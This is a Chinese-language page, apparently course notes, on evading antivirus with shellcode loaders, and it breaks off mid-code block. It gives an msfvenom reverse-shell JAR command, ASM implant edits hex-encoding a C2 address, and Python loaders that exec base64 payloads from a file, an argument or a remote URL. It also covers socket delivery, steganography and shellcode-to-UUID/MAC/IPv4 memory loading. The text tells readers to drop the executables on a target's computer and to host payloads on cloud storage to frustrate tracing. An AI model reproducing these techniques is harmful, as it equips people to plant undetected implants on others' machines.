&lt;h4 id=&#34;asm-免杀&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#asm-免杀&#34;&gt;#&lt;/a&gt; ASM 免杀&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;内联 C 混编&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过 c 与 asm 的混合代码来执行 shellcode. 实测情况下对防病毒软件都没有作用&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;花指令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过相关工具生成 asm 即汇编语言指令，加入到原有的内联 C 代码上干扰需要知道入口地址，通过 ollydeg 工具进行调试，重新打包文件，实测无效。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;编译汇编代码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;来源：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9mb3J1bS5idXRpYW4ubmV0L3NoYXJlLzE1MzY=&#34;&gt;https://forum.butian.net/share/1536&lt;/span&gt;&lt;br&gt;
 通过火绒剑抓取运行恶意软件时的进程，查看是否有远程 ip 及端口&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;发现30.4.204对应IP地址：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30h,2fh,2dh,30h,32h,2fh,2dh,33h,2dh,31h,2fh,33h,00h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;可以推断出在asm马中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30=1, 2f=0, 2d=., 32=3, 33=4, 31=2 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;构造ip若为47.94.236.117则马为&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33h,36h,2dh,38h,33h,2dh,31h,32h,35h,2dh,30h,30h,36h,00h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;端口：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82=52h 88=28h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编译器：https://www.masm32.com/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编译为obj文件：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ml /c /coff /Cp test.asm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成exe文件：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;link /subsystem:console /libpath:c:\masm32\lib test.obj&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在cs上选择http监听器监听端口即可免杀&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;java-免杀&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java-免杀&#34;&gt;#&lt;/a&gt; Java 免杀&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;JAR 包原型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;msfvenom -p java/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f jar -o msf.jar&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JAR 包源码特征修改免杀&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Jar 反编译导出 - jdgui&lt;br&gt;
 修改上线配置 - config&lt;br&gt;
 修改启动主类 - MANIFEST.MF&lt;br&gt;
 修改执行代码 - Main.java&lt;br&gt;
 打包 class-javac Main.java&lt;br&gt;
 编译 jar -jar cvfm xiaodi.jar META-INF/MANIFEST.MF .&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JAR 包打包 EXE 执行免杀&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;安装：exe4j Inno 进行打包&lt;br&gt;
 exe4j - 下载链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9leGU0ai5hcHBvbmljLmNvbS8=&#34;&gt;https://exe4j.apponic.com/&lt;/span&gt;&lt;br&gt;
inno - 下载链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qcnNvZnR3YXJlLm9yZy9pc2RsLnBocA==&#34;&gt;https://jrsoftware.org/isdl.php&lt;/span&gt;&lt;br&gt;
 操作说明：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8yMzYwMDAuaHRt&#34;&gt;https://www.jb51.net/article/236000.htm&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;py-无文件落地&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#py-无文件落地&#34;&gt;#&lt;/a&gt; py 无文件落地&lt;/h3&gt;
&lt;p&gt;是将 shellcode 直接加载进内存，由于没有文件落地，因此可以绕过文件扫 描策略的查杀。为了使内存免杀的效果更好，在申请内存时一般采用渐进式申 请一块可读写内存，在运行时改为可执行，在执行的时候遵循分离免杀的思想。 分离免杀包含对特征和行为的分离两个维度，把 shellcode 从放在程序转移到加载进内存，把整块的 shellcode 通过分块传输的方法上传然后再拼接，这些体现了基本的 “分离” 思想。&lt;/p&gt;
&lt;h4 id=&#34;从文本中提取木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#从文本中提取木马&#34;&gt;#&lt;/a&gt; 从文本中提取木马&lt;/h4&gt;
&lt;p&gt;从 msf/cs 生成木马，注意需要与自己使用的 python 的版本一致&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;读取编码木马文件&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用python将木马转化为base 64 编码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(base64.b64encode(b&amp;#x27;\xx\xx\...\xx&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将编码后的木马以文件的方式放在一个文件中，s.txt&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用python读取s.txt中的木马并执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s= open(&amp;#x27;s.txt&amp;#x27;,&amp;#x27;r&amp;#x27;).read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;再次利用py 2 exe打包py程序&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python setup py 2 exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将exe可执行程序与s.txt一起放置在对方电脑上，执行即可&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;编码木马文件做混淆&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注意 df 会对 s.txt 内容进行查杀，需要将 s.txt 做一个混淆&lt;br&gt;
即插入一堆乱字符如 xiaodi，在 py 代码中读取内容后做替换 data = data.replace (‘xiaodi’,’’)&lt;br&gt;
 再次用 py2exe 打包，切换新的混淆木马即可免杀 df&lt;/p&gt;
&lt;h4 id=&#34;从参数中提取木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#从参数中提取木马&#34;&gt;#&lt;/a&gt; 从参数中提取木马&lt;/h4&gt;
&lt;p&gt;生成的木马，以字节流即 shellcode=b’\xx\xx…\xx &#39; 的形式赋值&lt;br&gt;
将木马与执行 py 程序的代码全部合并进行 base 64 编码，编码的作用是为了防止空格回车的影响，可以将全部的程序从参数中读取&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编写如下py代码并用p2exe进行打包,使用时将可执行木马的&lt;span class=&#34;built_in&#34;&gt;base64&lt;/span&gt; 编码值从参数中读取&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import base 64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exec(base64.b64decode(sys.argv[1]))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;从http中提取木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#从http中提取木马&#34;&gt;#&lt;/a&gt; 从 http 中提取木马&lt;/h4&gt;
&lt;p&gt;同样的将木马即 py 执行木马的代码全部打包放在外部网站上，不建议使用自己的服务器读取编码后的木马，可以使用 oss 存储资源，这对对方的朔源会增。加很大的难度&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;py读取代码并同时执行读到的木马程序如下：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import base 64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from urllib.request import urlopen&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exec(base64.b64decode(urlopen(&amp;#x27;http://www.xxx.com/1.txt&amp;#x27;).read()))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;打包后将 exe 放置在对方的电脑上即可（可以尝试切换不同的打包起或者请求方式）。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;从socket获取木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#从socket获取木马&#34;&gt;#&lt;/a&gt; 从 socket 获取木马&lt;/h4&gt;
&lt;p&gt;参考：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vS2VlcC1BbWJpdGlvbi9wLzc0NTkyMTMuaHRtbA==&#34;&gt;https://www.cnblogs.com/Keep-Ambition/p/7459213.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;准备两个文件，一个为 socket.s 服务端代码，一个为 socket.c 客户端代码&lt;br&gt;
服务端代码负责接收 socket 通信，负责从客户端读取木马并进行解码执行，默认的 socket 通信是有一定的数量限制的，可以采用拼接的方式执行未能正常获取到的木马&lt;br&gt;
 exec (data.decode () + ‘xxxxxxxxxx’)&lt;/p&gt;
&lt;p&gt;服务端需要监听 0.0.0.0 即任意网卡，可以与任意 ip 地址建立连接，准备好服务端的代码通过 py2exe 打包放置在对方电脑上&lt;br&gt;
本地的 socket.c 文件需要填写上对方的 ip 地址建立通信，一旦通信建立成功，发送木马，就会上线拿下对方主机&lt;/p&gt;
&lt;h4 id=&#34;从图片中隐写木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#从图片中隐写木马&#34;&gt;#&lt;/a&gt; 从图片中隐写木马&lt;/h4&gt;
&lt;p&gt;参考:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvYzhVMk1faUo4cFdhSTUwc0g4dTlIdw==&#34;&gt;https://mp.weixin.qq.com/s/c8U2M_iJ8pWaI50sH8u9Hw&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;加密:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RGBAencodeDataInImage(im, arguments[&amp;#x27;&amp;lt;text&amp;gt;&amp;#x27;]).save(arguments[&amp;#x27;&amp;lt;encodedImage&amp;gt;&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;解密:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;im = Image.open(arguments[&amp;#x27;&amp;lt;encodedImage&amp;gt;&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过脚本将需要用 py 执行的木马隐写到图片中，再次通过 py 取读取隐写在图片中的代码并且执行，将加了木马的图片与 py 程序放在同一目录下测试。注意仍需要将木马进行编码，并且用 pyinstaller/py2exe 两者打包都进行尝试。&lt;/p&gt;
&lt;h3 id=&#34;内存加载免杀&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内存加载免杀&#34;&gt;#&lt;/a&gt; 内存加载免杀&lt;/h3&gt;
&lt;p&gt;文章参考：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjYyNjY2&#34;&gt;https://www.anquanke.com/post/id/262666&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;让 shellcode 看上去类似于电脑上自带的东西，伪装成这种数据去调用执行&lt;br&gt;
我们开辟一块内存，然后直接将 shellcode 写入到对应的内存中并且该内存是可读可写可执行的状态，那么这种方式太容易被 AV 所查杀，因此当我们如果是利用 Windows 自身提供的 API 来将加密或者封装好的 shellcode 写入到内存执行的话，将会大大增加查杀的难度&lt;/p&gt;
&lt;h4 id=&#34;shellcode转uuid&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#shellcode转uuid&#34;&gt;#&lt;/a&gt; ShellCode 转 UUID&lt;/h4&gt;
&lt;p&gt;通用唯一识别码 (UUID), 是用于计算机体系中以识别信息数目的一个 128 位 标识符，根据标准方法生成，不依赖中央机构的注册和分配，UUID 具有唯一 性。&lt;/p&gt;
&lt;p&gt;C++:py 将 shellcode 转为 C++ uuid，C++ 调用 uuid，编译为 exe 执行上线&lt;/p&gt;
&lt;p&gt;C#:py 将 shellcode 转为 C# uuid，C# 调用 uuid，编译为 exe 执行上线&lt;/p&gt;
&lt;p&gt;Py2:py 将 shellcode 转为 py uuid , py2 调用 uuid，pyinstaller 打包&lt;/p&gt;
&lt;p&gt;将 uuid 做分离，使用 http 请求进行无文件落地的内存免杀&lt;/p&gt;
&lt;p&gt;Go:py 将木马转为 go uuid , go 调用 uuid 并进行打包，需去除反 VT&lt;/p&gt;
&lt;p&gt;源码中会对免杀做反虚拟机调试，可以修改源代码删除此部分功能，或者有些特殊情况需要对方不是在虚拟机中执行，可以利用相关工具加保护。&lt;/p&gt;
&lt;h4 id=&#34;shellcode转mac&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#shellcode转mac&#34;&gt;#&lt;/a&gt; ShellCode 转 MAC&lt;/h4&gt;
&lt;p&gt;MAC 地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡 的 EPROM 一种闪存芯片，通常可以通过程序擦写。IP 地址与 MAC 地址在计算 机里都是以二进制表示的，IP 地址是 32 位的，而 MAC 地址则是 48 位 (6 个字节) 的。&lt;/p&gt;
&lt;p&gt;Python2: py 将 shellcode 转为 py MAC，py2 调用 MAC 加载，pyinstaller 打包&lt;/p&gt;
&lt;p&gt;Go: py 将 shellcode 转为 go MAC，go 调用 MAC 加载，go build 打包&lt;/p&gt;
&lt;h4 id=&#34;shellcode转ipv4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#shellcode转ipv4&#34;&gt;#&lt;/a&gt; ShellCode 转 IPV4&lt;/h4&gt;
&lt;p&gt;IPv4 是一种无连接的协议，操作在使用分组交换的链路层（如以太网）上。此协议会尽努力交付数据包，它不保证任何数据包均能送达目的地，也不保证所有数据包均按照正确的顺序无重复地到达。IPv4 使用 32 位（ 4 字节）地址。&lt;/p&gt;
&lt;p&gt;Go: py 将 shellcode 转为 go ipv4 ，go 调用 IPV4 加载，并加壳进行保护。&lt;/p&gt;
&lt;h3 id=&#34;nim-免杀&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nim-免杀&#34;&gt;#&lt;/a&gt; Nim 免杀&lt;/h3&gt;
&lt;p&gt;nim 编程：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NjeE1lcy9Db3JlLU5pbS1wcm9ncmFtbWluZw==&#34;&gt;https://github.com/ScxMes/Core-Nim-programming&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;nim 安装及上线：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvWUtrQ2NxZWlRTHd5dzRjSnZRSGlsQQ==&#34;&gt;https://mp.weixin.qq.com/s/YKkCcqeiQLwyw4cJvQHilA&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;工具封装木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#工具封装木马&#34;&gt;#&lt;/a&gt; 工具封装木马&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;NimShellCodeLoader&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FldmVyai9OaW1TaGVsbENvZGVMb2FkZXI=&#34;&gt;https://github.com/aeverj/NimShellCodeLoader&lt;/span&gt;&lt;br&gt;
 使用人数过多，已经变成了指纹库，不再具有免杀的特性&lt;/p&gt;
&lt;p&gt;nim 相关编译参数&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;c：编译成C语言，如：nim c test.nim&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cpp：编译成C++语言，如：nim cpp test.nim&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;objc：编译成objc语言&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;js：编译成javascript脚本, 可以建一个html文件在&amp;lt;script src=&amp;quot;test.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;里运行.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-d:release：进行release编译。nim cc -d:release test.nim&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-r：编译完成后运行程序&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--cincludes：包含当前目录(./)的 c头文件.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--cpu：指定架构，如：nim cc -cpu amd64 , nim cc -cpu:arm。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;编译x64：nim c -d:mingw --app:gui --cpu:amd64 -d:danger -d:strip --opt:size --passc=-flto --passl=-flto test.nim&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;编译x86：nim c -d:mingw --app:gui --cpu:i386 -d:danger -d:strip --opt:size --passc=-flto --passl=-flto test.nim&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;OffensiveNim 多种方式加载 shellcode&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2J5dDNibDMzZDNyL09mZmVuc2l2ZU5pbQ==&#34;&gt;https://github.com/byt3bl33d3r/OffensiveNim&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span 